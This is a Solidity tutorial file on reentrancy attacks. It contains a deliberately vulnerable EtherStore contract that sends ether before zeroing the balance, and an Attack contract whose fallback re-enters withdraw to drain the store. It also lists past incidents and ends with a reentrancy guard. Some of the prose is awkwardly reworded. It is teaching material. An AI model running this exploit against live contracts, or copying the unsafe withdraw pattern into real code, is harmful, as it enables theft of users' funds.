/**
 * In Solidity, the Reentrancy attack is among the most devastating attacks on the Ethereum Blockchain. A reentrancy attack happens when a function calls an untrusted contract from a different function.. As a result, the untrusted contract calls back to the original function in an attempt to drain the cash from the user's account.

* In order to drain the contract's funds, an attacker can repeatedly execute the withdraw function if the contract fails to update its state before sending payments. The DAO hack, which resulted in a loss of $60 million, is an example of a real-world Reentrancy attack.

* Despite the fact that reentry attacks have been around for two years, there have been situations like:

●	A reentrancy assault on the $25 million Uniswap/Lendf.Me network is expected in April 2020.

●	In May 2021, a reentrancy vulnerability and a fraudulent token contract resulted in a $7.2 million loss at BurgerSwap.

●	Reentrancy-based price manipulation appears to have been the motive behind the SURGEBNB hack (August 2021) that netted $4 million.

●	One of the most high-profile cyber attacks in recent memory, the CREAM Finance hack (August 2021) resulted in $18.8 million in losses.

●	AMM pools were abused via reentrancy attack in the September 2021 hack of the Siren protocol, which netted hackers $3.5 million.

A reentrancy attack involves two smart contracts. A vulnerable contract and an untrusted attacker’s contract.

Scenario of a Reentry Attack:-->

●	The vulnerable smart contract has 10 eth.

●	One Ethereum is stored by an attacker through the deposit mechanism.

●	Using the withdraw function, a malicious contract is designated as the beneficiary.

●	If it can be done, the withdraw function will be called:

●	Does the assailant have a balance of one eth? Yes, this is due to their down payment.

●	One Ether should be sent into the hands of a malicious contract. Attacker balance has not yet been changed (Please take note of this fact).

●	The withdraw function is called again by the fallback function when eth is received.

●	If it can be done, the withdraw function will be called:

●	Is there a single eth in the balance of the attacker? Yes, because the balance hasn't been recalculated yet.

●	Send 1 ethereum to a rogue contract.

●	until all of the contract's funds have been drained by the attacker.

 * Vulnerability:
Let's say that contract A calls contract B.Reentracy exploit allows B to call back into A before A finishes execution.
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * There is an issue when we deliver the user the amount of ether that they requested. In this case, the attacker uses the withdraw() function to exit the system. Even though he has already received tokens, he is able to transfer them because his balance has not yet been zeroed out.

Techniques of Prevention:

●	Before invoking external contracts, be sure all state changes have taken place.
●	Prevent re-entry via function modifiers.
●	A re-entry guard is shown here.

 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
